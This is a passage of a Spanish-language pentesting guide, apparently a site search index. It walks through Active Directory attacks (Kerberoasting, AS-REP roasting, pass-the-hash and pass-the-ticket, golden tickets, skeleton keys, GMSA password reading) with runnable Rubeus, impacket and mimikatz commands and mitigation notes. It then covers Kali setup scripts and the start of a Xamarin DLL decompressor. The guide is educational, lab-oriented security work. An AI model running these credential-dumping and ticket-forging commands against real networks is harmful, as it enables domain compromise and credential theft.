contrase\u00f1a.</li> <li>El DC le env\u00eda al usuario un Ticket Granting Ticket (TGT - Kerberos). El TGT es presentado a cualquier DC para probar la autenticaci\u00f3n con un ticket de servicio de Kerberos.</li> <li>El usuario abre Skype lo cual causa que la estaci\u00f3n de trabajo (computadora cliente) busqu\u00e9 el Service Principal Name (SPN) para el servidor de Exchange de usuarios.</li> <li>Una vez que el SPN es identificado, la computadora se comunica con el DC de nuevo y presenta el TGT del usuario as\u00ed como tambi\u00e9n el SPN del recurso al cual el usuario se necesita comunicar.</li> <li>El DC responde con el  Ticket Granting Service (TGS) de Kerberos.</li> <li>La estaci\u00f3n de trabajo del usuario presenta el TGS al servidor de Exchange para obtener acceso.</li> <li>Skype se conecta satisfactoriamente.</li> </ol> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion-rubeus","title":"Ejecuci\u00f3n - Rubeus","text":"<p>Haciendo uso de:</p> <pre><code>.\\Rubeus.exe kerberoast # Como Administrator\n.\\Rubeus.exe kerberoast /creduser:htb.local\\amanda /credpassword:Password123\n</code></pre> <p>Se permite el dumpeo de los usuarios aplicables.</p> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion-impacket","title":"Ejecuci\u00f3n - Impacket","text":"<p>Habiendo conseguido las credenciales de un usuario v\u00e1lido de la m\u00e1quina se puede ejecutar el ataque haciendo uso de:</p> <pre><code>impacket-GetUserSPNs {dominio/usuario:contrase\u00f1a} -dc-ip {ip de dominio} -request\n</code></pre> <p></p> <p>Nota: si se identifica un error similar a <code>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> basta con ejecutar <code>ntpdate &lt;HOST&gt;</code> para sincronizar la hora del sistema con la del servidor.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#crackeo","title":"Crackeo","text":"<p>Despu\u00e9s de conseguir el hash, se puede buscar crackearlo (ejemplo empleado con <code>hashcat -m 13100 kerberos.hash rockyou.txt</code> )</p> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#que-puede-hacer-una-cuenta-de-servicio","title":"\u00bfQu\u00e9 puede hacer una cuenta de servicio?","text":"<p>Despu\u00e9s de crackear una constrase\u00f1a de la cuenta de un servicio existen varias formas de exfiltrar datos o recolectar informaci\u00f3n relevante dependiendo de si la cuenta obtenida es un domain admin o no.</p> <p>Si la cuenta de servicio es un domain admin el control es similar a cuando se tiene un golden/silver ticket pudiendo obtener los contenidos de <code>NTDS.dit</code>.</p> <p>Si la cuenta de servicio no es un domain admin se puede usar para loguearse en otros clientes/sistemas y pivotear o escalar o validar que esa contrase\u00f1a crackeada sea reciclada para otro servicio o cuenta de usuario.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#mitigacion","title":"Mitigaci\u00f3n","text":"<ul> <li>Contrase\u00f1as fuertes.</li> <li>Principio del privilegio m\u00ednimo (en el ejemplo se configur\u00f3 un servicio el cu\u00e1l tiene permisos de administrador de dominio, siendo esto una configuraci\u00f3n com\u00fan no apropiada).</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#as-rep-roasting","title":"AS-REP Roasting","text":"<p>Este m\u00e9todo al igual que en Kerberoasting es usado para obtener los hashes krbasrep5 de cuentas de usuario que tienen la pre-autenticaci\u00f3n de Kerberos deshabilitada.</p> <p>A diferencia de Kerberoasting estos usuarios no necesitan ser cuentas de servicios, el \u00fanico requisito es que el usuario debe tener la pre-autenticaci\u00f3n deshabilitada.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#overview","title":"Overview","text":"<p>Mientras se realiza la pre-autenticaci\u00f3n, el hash de los usuarios ser\u00e1 usado para cifrar un timestamp que el DC intentar\u00e1 decifrar para validar que es el hash correcto el que se est\u00e1 usando. Despu\u00e9s de validar el timestamp el KDC generar\u00e1 un TGT para el usuario. Si la pre-autenticaci\u00f3n est\u00e1 deshabilitada se puede solicitar cualquier data de autenticaci\u00f3n para cualquier usuario y el KDC retornar\u00e1 un TGT cifrado que puede ser crackeado offline debido a que el KDC salta el paso de validaci\u00f3n que verifica que el usuario es quien dice ser.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion-rubeus_1","title":"Ejecuci\u00f3n - Rubeus","text":"<p>Haciendo uso de <code>Rubeus.exe asreproast</code> permite buscar usuarios vulnerables para extraer el hash del usuario vulnerable encontrado.</p> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion-impacket_1","title":"Ejecuci\u00f3n - Impacket","text":"<p>Impacket permite dos alcances a\u00f1adiendole un valor extra al m\u00e9todo, proponiendo 2 escenarios para la ejecuci\u00f3n (es necesario contar con una lista de usuarios potenciales o bien usar un diccionario):</p> <ol> <li>(Recomendada) Dando una lista de usuarios existentes en el sistema, es decir, hacer previamente enumeraci\u00f3n de usuarios con Kerbrute, de esta manera s\u00f3lo se realizar\u00e1 la b\u00fasqueda de usuarios vulnerables.</li> <li>Proporcionar un diccionario de usuarios sin realizar la validaci\u00f3n de su existencia, de esta manera impacket verificar\u00e1 la existencia del usuario antes de buscar la vulnerabilidad.</li> </ol> <p>Haciendo uso de <code>impacket-GetNPUsers {dominio/usuario:contrase\u00f1a} -dc-ip {ip de dominio} -no-pass</code> (uso dependiente de escenario).</p> <p>Habiendo realizado antes la enumeraci\u00f3n de usuarios existentes el comando:</p> <pre><code>for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip &lt;ip de dominio&gt; &lt;dominio&gt;/${user} -no-pass | grep -v Impacket; done\n</code></pre> <p>Se realiza un filtrado conveniente para identificar la vulnerabilidad.</p> <p></p> <ol> <li>Enumeraci\u00f3n de usuarios.</li> <li>Uso de impacket.</li> </ol>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#crackeo_1","title":"Crackeo","text":"<p>Despu\u00e9s de conseguir el hash, si se desea usar hashcat para crackearlo es necesario concatenar <code>23$</code> despu\u00e9s de <code>$krb5asrep$</code> obteniendo algo como <code>$krb5asrep$23$User...</code> usando <code>hashcat -m 18200 asrep.hash rockyou.txt</code> )</p> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#mitigacion_1","title":"Mitigaci\u00f3n","text":"<ul> <li>Mantener una pol\u00edtica de contrase\u00f1as fuertes.</li> <li>No deshabilitar la pre-autenticaci\u00f3n de Kerberos a menos que sea necesario.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#pass-the-ticket","title":"Pass The Ticket","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#overview_1","title":"Overview","text":"<p>Este m\u00e9todo est\u00e1 basado en extraer el TGT de la memoria LSASS de la m\u00e1quina. El Local Security Authority Subsystem Service (LSASS) es un proceso de memoria que guarda credenciales en el servidor de directorio activo y puede guardar tickets de Kerberos junto con otro tipo de credenciales por lo que act\u00faa como portero aceptando o rechazando las credenciales que reciba. Lost tickets de Kerberos se pueden extraer de la memoria LSASS al igual como los hashes.</p> <p>Al extraer los tickets con mimikatz se obtendr\u00e1 un ticket <code>.kirbi</code> que puede ser usado para ganar acceso como domain admin si un ticket de un domain admin se encuentra en la memoria LSASS. Este ataque es ideal como t\u00e9cnica para hacer escalaci\u00f3n de privilegios y movimiento lateral si se encuentran disponibles tickets no asegurados de una cuenta de servicio de dominio.</p> <p>El ataque permite escalar a domain admin si se extrae un ticket del mismo para impersonar ese ticket usando el ataque PTT de mimikatz permitiendo actuar como domain admin.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_3","title":"Ejecuci\u00f3n","text":"<p>Con <code>sekurlsa::tickets /export</code> se exportar\u00e1 los tickets .kirbi al directorio donde actualmente se encuentre.</p> <p></p> <p>Despu\u00e9s de identificar un ticket que se pueda utilizar se usa <code>kerberos::ptt &lt;ticket&gt;</code> siendo el ticket el archivo que se export\u00f3 previamente y con <code>klist</code> fuera de mimikatz se nos permite validar que el usuario se haya cargado correctamente.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#mitigacion_2","title":"Mitigaci\u00f3n","text":"<ul> <li>Evitar que los domain admins se logueen a nada que no sea el domain controller ya que a pesar de ser algo simple es f\u00e1cil caer en la mala pr\u00e1ctica de loguearse en computadoras \"low-level\" dejando tickets abriendo posibilidad al uso del ataque.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#pass-the-hash","title":"Pass The Hash","text":"<p>Se refiere a que si se llega a crackear contrase\u00f1a y/o se obtienen hashes SAM, se pueden aprovechar ambas para realizar movimiento lateral a trav\u00e9s de la red.</p> <p>Haciendo uso de <code>crackmapexec</code> se pueden validar las credenciales previamente crackeadas en un host en espec\u00edfico o en un segmento de red.</p> <p>Utilizando:</p> <pre><code>crackmapexec {protocolo} {ip/rango} -u {usuario} -d {dominio} -p {contrase\u00f1a}\n</code></pre> <p>Donde protocolo puede ser <code>{smb, winrm, ssh, mssql, ldap}</code>.</p> <p>Ejemplo:</p> <p></p> <p>O bien, con el hash obtenido se puede loguear a la cuenta igualmente usando <code>crackmapexec</code>.</p> <pre><code>crackmapexec {protocolo} {ip/rango} -u {usuario} -H {hash} --local-auth\n</code></pre> <p>Ejemplo:</p> <p></p> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#dumpeo-de-hashes","title":"Dumpeo de hashes","text":"<p>Haciendo uso de <code>impacket-secretsdump</code> se puede loguear en la cuenta y m\u00e1quina objetivo para obtener los hashes existentes.</p> <p></p> <p>Posteriormente ejecutando <code>hashcat</code> se puede buscar crackear la colecci\u00f3n de hashes obtenidos indic\u00e1ndolo en las banderas.</p> <pre><code>.\\hashcat.exe -m {hashmode} {archivo de hashes} {diccionario}\n</code></pre> <p></p> <p>Para buscar obtener una shell se puede usar <code>impacket-psexec</code>, <code>impacket-smbexec</code> o <code>impacket-wmiexec</code> pas\u00e1ndole el hash obtenido para autenticarse con \u00e9l en lugar de la contrase\u00f1a.</p> <p>Ejemplo:</p> <pre><code>impacket-psexec Gwyn:@192.168.111.145 -hashes {valor}\n</code></pre> <p>TODO: Agregar imagen</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#mitigaciones","title":"Mitigaciones","text":"<p>Es dif\u00edcil de prevenir por completo, pero se le puede hacer m\u00e1s dif\u00edcil a un atacante:</p> <ul> <li>Limitar reusos en las cuentas:</li> <li>Evitar reusar la contrase\u00f1a del administrador local.</li> <li>Deshabilitar las cuentas de Guest y Administrator.</li> <li>Limitar al administrador local (privilegios m\u00ednimos).</li> <li>Usar contrase\u00f1as fuertes:</li> <li>Entre m\u00e1s largas mejor (mayor a 14 caracteres).</li> <li>Evitar usar palabras com\u00fanes.</li> <li>Oraciones largas.</li> <li>Privilege Access Management (PAM)</li> <li>Check out/in cuentas sensibles cuando sea necesario.</li> <li>Rotar contrase\u00f1as autom\u00e1ticamente en el check out y check in.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#token-impersonation","title":"Token Impersonation","text":"<p>Los tokens son llaves temporales que permiten el acceso a un sistema o red sin tener que proveer credenciales cada vez que se accede a un archivo (como las cookies de una computadora).</p> <p>Tipos:</p> <ul> <li>Delegate. Creados para loguearse a una m\u00e1quina o para usar escritorio remoto.</li> <li>Impersonate. \"non-interactive\" tal como agregar una unidad de red o un script de logueo de dominio.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_4","title":"Ejecuci\u00f3n","text":"<p>TODO</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#metasploit","title":"Metasploit","text":"<p>Se encuentra disponible el m\u00f3dulo <code>incognito</code> el cual se puede cargar a una sesi\u00f3n de meterpreter con <code>load incognito</code>.</p> <p></p> <p>Para visualizar los tokens que se encuentran actualmente en la m\u00e1quina se hace uso de <code>list_tokens -u</code> (pudiendo visualizar tokens no s\u00f3lo de usuarios si no de grupos lo que es indicado con la bandera agregada <code>-u</code>).</p> <p></p> <p>Para poder utilizar el token se ocupa <code>impersonate_token {usuario}</code>.</p> <p></p> <p>Nota: Los tokens son v\u00e1lidos hasta el reinicio de una m\u00e1quina.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#non-metasploit","title":"Non-metasploit","text":"<p>Haciendo uso de ataques de tipo Juicy, Rotten y Lonely Potatoe.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#mitigacion_3","title":"Mitigaci\u00f3n","text":"<ul> <li>Limitar permiso de creaci\u00f3n de tokens usuario/grupo.</li> <li>Gestionar niveles de cuenta (account tiering).</li> <li>Restricci\u00f3n a administrador local.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#group-policy-preferences-gpp-aka-ms14-025","title":"Group Policy Preferences (GPP) - AKA MS14-025","text":"<ul> <li>Las Group Policy Preferences permiten a los administradores crear pol\u00edticas usando credenciales embebidas.</li> <li>Estas credenciales son cifradas y almacenadas en una \"cPassword\".</li> <li>La llave fue accidentalmente lanzada (whoops).</li> <li>Parchada en MS14-025 pero no previene usos previos.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_5","title":"Ejecuci\u00f3n","text":"<p>La vulnerabilidad radica en que la llave de cifrado es p\u00fablica, por lo que si se llega a obtener el valor de lo que cifra, es decir, <code>cpassword</code> se encuentra expuesta a descifrarse, haciendo uso de <code>gpp-decrypt</code>. Ver referencias y write-up de m\u00e1quina Active de HTB para m\u00e1s informaci\u00f3n.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#mimikatz","title":"Mimikatz","text":"<ul> <li>Herramienta empleada para ver y obtener credenciales, generar tickets de Kerberos.</li> <li>Recupera credenciales alojadas en memoria.</li> <li>Permite ejecutar ataques: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#credential-dumping","title":"Credential Dumping","text":"<ul> <li>Bypass de protecci\u00f3n y acceso a memoria: <code>privilege::debug</code>.</li> <li>Extracci\u00f3n de informaci\u00f3n de cuentas logueadas desde el \u00faltimo reinicio (hashes NTLM):  <code>sekurlsa::logonpasswords</code>.</li> <li>Dumpeo de SAM: <code>lsadump::sam</code> | <code>lsadump::sam /patch</code>.</li> <li>Dumpeo de LSA: <code>lsadump::lsa /patch</code>. LSA (Local Security Authority) subsistema protegido de autenticaci\u00f3n de windows, autentica y crea sesiones de logueo en la computadora local.</li> </ul>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#goldensilver-tickets","title":"Golden/Silver Tickets","text":"<p>Un silver ticket en ocasiones puede ser empleado en vez de un golden ticket debido a que es m\u00e1s discreto. Si ser sigiloso y permanecer sin ser detectado importa para el ejercicio, esta opci\u00f3n resulta m\u00e1s conveniente que un golden ticket sin embargo, el proceso a realizar para generar uno es el mismo. La diferencia principal es que el silver ticket est\u00e1 limitado al servicio al que se utiliz\u00f3 como objetivo por lo que en el golden ticket se tiene acceso a cualquier servicio de Kerberos.</p> <p>Un escenario espec\u00edfico para un silver ticket podr\u00eda presentarse al querer el acceso al servidor SQL del dominio sin embargo se comprometi\u00f3 un usuario el cual no tiene acceso a ese servidor. Se encuentra una cuenta de servicio accesible para obtener el primer contacto por medio de kerberoasting a el servicio para extraer el hash del servicio e impersonar su TGT para poder solicitar un ticket de servicio para el servicio SQL del KDC permitiendo as\u00ed el acceso al servidor SQL del dominio.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#krbtgt-overview","title":"KRBTGT Overview","text":"<p>Para ayudar a compreder como funcionan estos ataques es importante entender la diferencia entre KRBTGT y TGT. KRBTGT es una cuenta de servicio para el KDC (Key Distribution Center) este genera todos los tickets de los clientes. Si se impersona esta cuenta y se crea un golden ticket de la KRBTGT significa que se tiene la habilidad de crear un ticket de servicio de cualquier cosa que se desee. Un TGT es un ticket asignado a una cuenta de servicio generado por el KDC y s\u00f3lo se puede tener acceso a ese servicio, lo que en el escenario planteado representar\u00eda un  ticket del servicio SQL por ejemplo.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#attack-overview","title":"Attack Overview","text":"<p>En el ataque se extrae un TGT para cualquier usuario de dominio que preferentemente se buscar\u00eda un domain admin, sin embargo para un golden ticket se buscar\u00eda extraer el ticket krbtgt y para un silver ticket se buscar\u00eda extraer un ticket de cualquier servicio o de un domain admin. Esto proveer\u00eda con el SID (Security Identifier) de la cuenta objetivo (de servicio o domain admin) que es \u00fanico para cada cuenta.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_6","title":"Ejecuci\u00f3n","text":"<p>Para realizar el procedimiento es necesario obtener el identificador el dominio y el hash NTLM de la cuenta de krbtgt, obteni\u00e9ndolo mediante <code>lsadump::lsa /inject /name:krbtgt</code> en mimikatz. En el caso de se opte por un silver ticket se necesitar\u00eda cambiar el par\u00e1metro <code>/name:&lt;cuenta&gt;</code> para extraer el hash de una cuenta domain admin o una cuenta de servicio.</p> <p></p> <p>Ejecutar:</p> <p><pre><code>kerberos::golden /User:&lt;nombre_de_usuario&gt; /domain:&lt;dominio&gt; /sid:&lt;sid_extraido&gt; /krbtgt:&lt;hash_NTLM&gt; /id:&lt;rid&gt; /ptt\n</code></pre> Usando <code>/ptt</code> para inyectarlo en la sesi\u00f3n actual o sin la bandera para extraerlo a un archivo. Ejemplo:</p> <pre><code>kerberos::golden /User:Administrator /domain:dsouls.local /sid:S-1-5-21-1128842135-684543689-3182004798 /krbtgt:cbb7b576e46b82269910709d9d92ef2d /id:500 /ptt\n</code></pre> <p>Para crear un silver ticket se sustituir\u00eda el hash NTLM del servicio en <code>/krbtgt:&lt;hash&gt;</code> el SID del servicio en <code>/sid:&lt;sid&gt;</code> y cambiar el id por <code>/id:1103</code>.</p> <p></p> <p>TODO: Verificar la inyecci\u00f3n del ticket desde fuera.</p> <ul> <li>Levantar una sesi\u00f3n cmd con el ticket creado: <code>misc::cmd</code>.</li> <li>Visualizar contenido de un cliente perteneciente al dominio: <code>dir \\\\SITH\\c$</code>.</li> <li>Obtener una shell interactiva en cliente remoto con psexec: <code>psexec.exe \\\\SITH cmd.exe</code></li> </ul> <p></p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#kerberos-backdoors","title":"Kerberos Backdoors","text":"<p>Existe una forma m\u00e1s sutil de realizar un ataque similar al del golden y silver ticket  ya que act\u00faa similar a un rootkit implantandose por si mismo en la memoria en el domain forest permiti\u00e9ndose acceso a cualquier m\u00e1quina usando una contrase\u00f1a maestra.</p> <p>La skeleton key abusa la forma en la que AS-REQ valida los timestamps cifrados y s\u00f3lo funciona usando el cifrado RC4 de Kerberos.</p> <p>El hash por defecto para una skeleton key de mimikatz es <code>60BA4FCADC466C7A033C178194C03DF6</code> que resulta en la contrase\u00f1a mimikatz.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#skeleton-key-overview","title":"Skeleton Key Overview","text":"<p>De acuerdo a lo antes mencionado, el timestamp es cifrado con el hash NT de los usuarios. El domain controller despu\u00e9s intenta descifrar el timestamp con el hash NT del usuario, una vez que la skeleton key sea implantada en el domain controller trata de decifrar el timestamp usando el hash NT del usuario y el hash NT de la skeleton key permitiendo el acceso al domain forest.</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#ejecucion_7","title":"Ejecuci\u00f3n","text":"<p><code>misc::skeleton</code></p> <p>TODO: evidencia</p>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#abusando-de-aclsaces","title":"Abusando de ACLs/ACEs","text":""},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#readgmsapassword","title":"ReadGMSAPassword","text":"<p>Un atacante puede leer la contrase\u00f1a GMSA para la cuenta que es aplicada la ACE.</p> <pre><code># Save the blob to a variable\n$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'\n$mp = $gmsa.'msDS-ManagedPassword'\n\n# Decode the data structure using the DSInternals module\nConvertFrom-ADManagedPasswordBlob $mp\n# Build a NT-Hash for PTH\n(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash\n# Alterantive: build a Credential-Object with the Plain Password\n$cred = new-object system.management.automation.PSCredential \"Domain\\Target_Account\",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword\n# Visualizar la contrase\u00f1a en texto claro\nConvertTo-SecureString $mp -AsPlainText -Force\n</code></pre>"},{"location":"Gu%C3%ADas/Active%20Directory/1_attacking/#referencias","title":"Referencias","text":"<ul> <li>Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition).</li> <li>NTLM relaying and Kerberos delegation.</li> <li>PowerView CheatSheet.</li> <li>Kerberoasting your way in.</li> <li>Pentesting in the Real World: Group Policy Pwnage.</li> <li>Ejercicio GPP - HTB Active.</li> <li>Attacking Kerberos - TryHackMe</li> <li>Pass-The-Ticket (PTT) attack in Mimikatz (and a Gotcha!)</li> <li>AS-REP Roasting</li> <li>Kerberoasting Revisited</li> <li>Not A Security Boundary: Breaking Forest Trusts</li> <li>Kerberos Authentication Explained</li> <li>Abusing Kerberos</li> <li>Kerberos &amp; Attacks 101</li> <li>ReadGMSAPassword</li> </ul>"},{"location":"Gu%C3%ADas/Kali%20Environment/","title":"Kali-Environment","text":"<ul> <li>TODO: script para realizar setup parcial o completo.</li> </ul>"},{"location":"Gu%C3%ADas/Kali%20Environment/#reconfiguracion-de-teclado","title":"Reconfiguraci\u00f3n de teclado","text":"<pre><code>sudo dpkg-reconfigure keyboard-configuration\nsudo service keyboard-setup restart\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#instalacion-utilerias","title":"Instalaci\u00f3n utiler\u00edas","text":"<pre><code>sudo apt update\nsudo apt install -y lsd bat jq seclists xclip\n</code></pre> <ul> <li>Oh my tmux</li> <li>fzf</li> </ul>"},{"location":"Gu%C3%ADas/Kali%20Environment/#pyenv","title":"Pyenv","text":"<pre><code>sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git\ncurl https://pyenv.run | bash\n</code></pre> <p>Buscar en <code>.zshrc</code> o <code>.bashrc</code> si no se encuentran las siguientes l\u00edneas, ponerlas.</p> <pre><code>export PATH=\"$HOME/.pyenv/bin:$PATH\"\neval \"$(pyenv init --path)\"\neval \"$(pyenv virtualenv-init -)\"\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#sdkman","title":"SDKMan","text":"<pre><code>curl -s \"https://get.sdkman.io\" | bash\nsdk list java\nsdk install java &lt;version o nombre&gt;\nsdk use &lt;version o nombre&gt; # ysoserial requiere java 8\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#navegador","title":"Navegador","text":"<ul> <li>FoxyProxy.</li> <li>Wappalizer.</li> <li>Configuraci\u00f3n de certificado de BurpSuite.</li> <li>CookieEditor.</li> </ul>"},{"location":"Gu%C3%ADas/Kali%20Environment/#configuraciones-personales","title":"Configuraciones personales","text":"<pre><code>sudo useradd -m srrequiem\nsudo usermod -a -G sudo srrequiem\nsudo chsh -s /bin/zsh srrequiem\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#tmuxconflocal","title":".tmux.conf.local","text":"<pre><code>tmux_conf_copy_to_os_clipboard=true\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#zshrc","title":".zshrc","text":"<pre><code>[...]\n# Comentar l\u00edneas siguientes\n# some more ls aliases\n#alias ll='ls -l'\n#alias la='ls -A'\n#alias l='ls -CF'\n[...]\n\n# Enable ~/.target file\n\nexport TARGET_FILE=\"$HOME/.target\"\n\nif ! [ -f \"$TARGET_FILE\" ]\nthen\n    touch $TARGET_FILE\nfi\n\nexport TARGET=\"$(cat $TARGET_FILE)\"\n\n# Custom aliases\n\nalias ll='lsd -lh --group-dirs=first'\nalias la='lsd -a --group-dirs=first'\nalias l='lsd --group-dirs=first'\nalias lla='lsd -lha --group-dirs=first'\nalias ls='lsd --group-dirs=first'\nalias cat='/bin/batcat'\nalias catn='/bin/cat'\nalias catnl='/bin/batcat --paging=never'\n\n# Custom functions\n\nfunction new_target(){\n    # Usage: new_target &lt;box name&gt; &lt;box IP&gt;\n    set_target $2\n    mkdir -p $1/{nmap,content,exploits,scripts}\n    cd $1\n    tmux\n}\n\nfunction set_target(){\n    # Usage: set_target &lt;box IP&gt;\n    echo $1 &gt; $TARGET_FILE\n    export TARGET=$1\n}\n\nfunction clear_target(){\n    echo '' &gt; $TARGET_FILE\n    unset TARGET\n}\n\nfunction extract_ports(){\n    ports=\"$(cat $1 | grep -oP '\\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')\"\n    ip_address=\"$(cat $1 | grep -oP '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}' | sort -u | head -n 1)\"\n    echo -e \"\\n[*] Extracting information...\\n\" &gt; extractPorts.tmp\n    echo -e \"\\t[*] IP Address: $ip_address\"  &gt;&gt; extractPorts.tmp\n    echo -e \"\\t[*] Open ports: $ports\\n\"  &gt;&gt; extractPorts.tmp\n    echo $ports | tr -d '\\n' | xclip -sel clip\n    echo -e \"[*] Ports copied to clipboard\\n\"  &gt;&gt; extractPorts.tmp\n    cat extractPorts.tmp; rm extractPorts.tmp\n}\n\nfunction set_proxy() {\n    # Usage: set_proxy &lt;host&gt; &lt;port&gt;\n    export {http,https,ftp}_proxy=\"http://$1:$2\"\n}\n\nfunction unset_proxy() {\n    unset {http,https,ftp}_proxy\n}\n\nexport PYENV_ROOT=\"$HOME/.pyenv\"\ncommand -v pyenv &gt;/dev/null || export PATH=\"$PYENV_ROOT/bin:$PATH\"\neval \"$(pyenv init -)\"\neval \"$(pyenv virtualenv-init -)\"\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#scripts-para-xcfe4-barra","title":"Scripts para xcfe4 (barra)","text":"<p>Click derecho a barra superior: <code>Panel/Add New Items...</code> \u2192 <code>Generic Monitor</code></p> <p>Ubicaci\u00f3n: <code>/home/srrequiem/scripts</code></p>"},{"location":"Gu%C3%ADas/Kali%20Environment/#ethernetsh","title":"ethernet.sh","text":"<pre><code>#!/bin/sh\n\necho \"$(/usr/sbin/ifconfig eth0 | grep \"inet \" | awk '{print $2}')\"\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#vpnsh","title":"vpn.sh","text":"<pre><code>#!/bin/sh\n\nIFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')\n\nif [ \"$IFACE\" = \"tun0\" ]\nthen\n    echo \"$(/usr/sbin/ifconfig tun0 | grep \"inet \" | awk '{print $2}')\"\nelse\n    echo \"Disconnected\"\nfi\n</code></pre>"},{"location":"Gu%C3%ADas/Kali%20Environment/#targetsh","title":"target.sh","text":"<pre><code>#!/bin/sh\n\nTARGET=$(cat /home/srrequiem/.target)\n\nif [ \"$TARGET\" = \"\" ]\nthen\n    echo \"None\"\nelse\n    cat /home/srrequiem/.target\nfi\n</code></pre>"},{"location":"Gu%C3%ADas/Mobile/General/","title":"General","text":""},{"location":"Gu%C3%ADas/Mobile/General/#frameworks","title":"Frameworks","text":""},{"location":"Gu%C3%ADas/Mobile/General/#xamarin","title":"Xamarin","text":""},{"location":"Gu%C3%ADas/Mobile/General/#decompresion-de-dlls-compresion-xalz","title":"Decompresi\u00f3n de DLLs (Compresi\u00f3n XALZ)","text":"<p>Posterior al proceso de decompilaci\u00f3n/extraci\u00f3n de la aplicaci\u00f3n es posible encontrarse con DLLs extra\u00eddas que parecieran estar da\u00f1adas o ser identificadas como tipo de archivo <code>Sony PlayStation Audio</code>.</p> <p></p> <p>Por lo tanto, al abrirse en alg\u00fan decompilador relacionado a la tecnolog\u00eda (<code>ILSpy</code>, etc) no reconocer\u00e1 el archivo, ya que existe un tipo de compresi\u00f3n de archivos utilizado por el framework para el compilado de la aplicaci\u00f3n, descrito en este pull request donde se puede encontrar m\u00e1s informaci\u00f3n al respecto del tipo de archivos comprimidos XALZ.</p> <p>Durante la ejecuci\u00f3n de un pentest a un aplicativo m\u00f3vil se enfrent\u00f3 esta situaci\u00f3n, encontrando la soluci\u00f3n al problema gracias a este art\u00edculo publicado por X41 DSec en el que se propone el siguiente script para descomprimir la DLL (repositorio de Github).</p> Xamarin_XALZ_decompress.py<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\"\"\"\nInstallation notes:\nThis program requires the python lz4 library.\nInstall via \n* \"lz4\" (pip) \n* \"python3-lz4\" (Debian, Ubuntu)\n\"\"\"\n\nimport lz4.block\nimport sys\nimport struct\n\ndef print_usage_and_exit(): \n    sys.exit(\"usage: ./command compressed-inputfile.dll uncompressed-outputfile.dll\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 3:\n        print_usage_and_exit()\n\n    input_filepath = sys.argv[1]\n    output_filepath = sys.argv[2]\n    header_expected_magic = b'XALZ'\n\n    with open(input_filepath, \"rb\") as xalz_file:\n        data = xalz_file.read()\n\n        if data[:4] != header_expected_magic:\n            sys.exit(\"The input file does not contain the expected magic bytes, aborting ...\")\n\n        header_index = data[4:8]\n        header_uncompressed_length = struct.unpack('&lt;I', data[8:12])[0]\n        payload = data[12:]\n\n        print(\"header index: %s\" % header_index)\n        print(\"compressed payload size: %s bytes\" % len(payload))\n        print(\"uncompressed length according to header: %s bytes\" % 